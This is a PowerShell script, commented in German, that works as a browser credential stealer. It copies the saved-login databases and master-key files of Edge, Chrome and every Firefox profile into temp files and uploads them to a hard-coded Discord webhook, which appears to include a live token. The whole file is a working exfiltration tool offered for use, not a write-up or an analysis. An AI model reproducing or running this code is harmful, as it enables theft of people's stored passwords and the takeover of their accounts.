# Logging-Funktion
function Write-Log {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    # Log auch in die Konsole ausgeben, damit man sieht was passiert
    Write-Host "$timestamp - $message"
}

# Funktion zum Kopieren von Dateien und Senden an den Webhook
function Copy-And-Send {
    param (
        [string]$browserName,
        [string]$dbPath,
        [string]$masterKeyPath,
        [string]$profileName = "Default", # Default-Wert für Profilnamen
        [string]$webhookUri
    )

    # Erstelle eindeutigere temporäre Dateinamen
    $guid = [guid]::NewGuid().ToString().Substring(0, 8)
    $tempDb = [System.IO.Path]::Combine($env:TEMP, "${browserName}_${profileName}_${guid}_LoginData")
    $tempMasterKey = [System.IO.Path]::Combine($env:TEMP, "${browserName}_${profileName}_${guid}_MasterKey")

    $dbCopied = $false
    $keyCopied = $false

    # Kopieren der Datenbank, um Sperren zu vermeiden
    if (Test-Path $dbPath) {
        try {
            Copy-Item -Path $dbPath -Destination $tempDb -Force -ErrorAction Stop
            Write-Log "Copied database for $browserName ($profileName): From '$dbPath' to '$tempDb'"
            $dbCopied = $true
        } catch {
            Write-Log "ERROR copying database for $browserName ($profileName): From '$dbPath' to '$tempDb'. Error: $($_.Exception.Message)"
        }
    } else {
        Write-Log "Database path not found for $browserName ($profileName): '$dbPath'"
    }

    # Kopieren des Masterkeys
    if (Test-Path $masterKeyPath) {
        try {
            Copy-Item -Path $masterKeyPath -Destination $tempMasterKey -Force -ErrorAction Stop
            Write-Log "Copied master key for $browserName ($profileName): From '$masterKeyPath' to '$tempMasterKey'"
            $keyCopied = $true
        } catch {
            Write-Log "ERROR copying master key for $browserName ($profileName): From '$masterKeyPath' to '$tempMasterKey'. Error: $($_.Exception.Message)"
        }
    } else {
        Write-Log "Master key path not found for $browserName ($profileName): '$masterKeyPath'"
    }

    # Nur senden, wenn BEIDE Dateien erfolgreich kopiert wurden
    if ($dbCopied -and $keyCopied) {
        try {
            # Dateien als Objekte für den Upload holen
            $dbFileObject = Get-Item -Path $tempDb
            $masterKeyFileObject = Get-Item -Path $tempMasterKey

            # Nachricht für Discord vorbereiten
            $messageContent = "Login data files for Browser: '$browserName', Profile: '$profileName'"

            # Parameter für Invoke-RestMethod zum Senden von Dateien (multipart/form-data)
            $Parameters = @{
                "Uri"         = $webhookUri
                "Method"      = "POST"
                "Form"        = @{
                    "content"      = $messageContent
                    "file1"        = $dbFileObject       # Login Data / logins.json
                    "file2"        = $masterKeyFileObject # Local State / key4.db
                    # Discord kann den Dateinamen aus dem FileObject extrahieren
                }
            }

            Write-Log "Attempting to send files for $browserName ($profileName) to webhook..."
            Invoke-RestMethod @Parameters
            Write-Log "Successfully sent files for $browserName ($profileName): '$($dbFileObject.Name)' and '$($masterKeyFileObject.Name)'"

        } catch {
            Write-Log "FAILED to send data for $browserName ($profileName). Error: $($_.Exception.Message)"
            # Optional: Mehr Details ausgeben
             if ($_.Exception.Response) {
                $responseStream = $_.Exception.Response.GetResponseStream()
                $streamReader = New-Object System.IO.StreamReader($responseStream)
                $responseBody = $streamReader.ReadToEnd()
                $streamReader.Close()
                $responseStream.Close()
                Write-Log "Webhook Response Body: $responseBody"
            }
        }
    } else {
         Write-Log "Skipping send for $browserName ($profileName) because one or both files failed to copy."
    }

    # Temporäre Dateien löschen, falls sie erstellt wurden
    if (Test-Path $tempDb) {
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $tempMasterKey) {
        Remove-Item $tempMasterKey -Force -ErrorAction SilentlyContinue
    }
}

# --- Hauptskript ---

# Webhook URI (aus dem Befehl des Benutzers übernommen)
$whuri='https://discord.com/api/webhooks/1355949143268528301/SIQpL0F3yp3e2XGF-pDTJRW0vKBTP1ZBjWmYj1az0xIo9poOkGlmcXRoJbJA2at5PX5Z'

Write-Log "Script started."

# Pfade für Chromium-basierte Browser (Edge, Chrome)
$chromiumPaths = @{
    "Edge" = @{
        "dbPath" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        "masterKeyPath" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    }
    "Chrome" = @{
        "dbPath" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        "masterKeyPath" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    }
    # Füge hier weitere Chromium-Browser hinzu, falls nötig (z.B. Brave, Vivaldi)
}

# Kopieren und Senden für jeden Chromium-Browser
foreach ($browser in $chromiumPaths.Keys) {
    $paths = $chromiumPaths[$browser]
    # Übergebe den Webhook URI an die Funktion
    Copy-And-Send -browserName $browser -dbPath $paths.dbPath -masterKeyPath $paths.masterKeyPath -webhookUri $whuri
}

# Spezielle Behandlung für Firefox
$firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfileDir) {
    Write-Log "Firefox profile directory found: '$firefoxProfileDir'"
    # Hole alle Profil-Ordner
    $profiles = Get-ChildItem -Path $firefoxProfileDir -Directory
    if ($profiles.Count -eq 0) {
        Write-Log "No Firefox profiles found in '$firefoxProfileDir'."
    } else {
        foreach ($profile in $profiles) {
            $profileName = $profile.Name
            # KORREKTE Pfadkonstruktion mit Join-Path oder .FullName
            $dbPath = Join-Path -Path $profile.FullName -ChildPath 'logins.json'
            $masterKeyPath = Join-Path -Path $profile.FullName -ChildPath 'key4.db'

            Write-Log "Processing Firefox profile: '$profileName'"
            # Übergebe den Webhook URI an die Funktion
            Copy-And-Send -browserName "Firefox" -dbPath $dbPath -masterKeyPath $masterKeyPath -profileName $profileName -webhookUri $whuri
        }
    }
} else {
    Write-Log "Firefox profile directory not found: '$firefoxProfileDir'"
}

Write-Log "Script execution completed."